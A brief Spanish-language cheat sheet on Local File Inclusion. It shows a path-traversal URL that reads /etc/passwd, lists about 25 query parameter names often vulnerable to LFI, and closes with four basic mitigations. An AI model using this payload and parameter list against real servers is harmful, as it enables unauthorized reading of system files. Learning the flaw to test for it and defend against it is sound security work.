### Local File Inclusion
La vulnerabilidad se produce cuando el usuario puede controlar de alguna manera el archivo que va a ser cargado por el servidor.

## LFI básico y Bypass
```shell
http://www.example.com/index.php?page=../../../etc/passwd
```
### Parámetros
Posibles parámetros principales que podrían ser vulnerables a las vulnerabilidades de inclusión de  archivos locales (LFI)
```shell
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## Mitigación ej. básicos
1. Validar entradas.
2. Uso de rutas absolutas.
3. Configuración del servidor limitando acceso a ciertos archivos.
4. Escapar y Sanitizar.

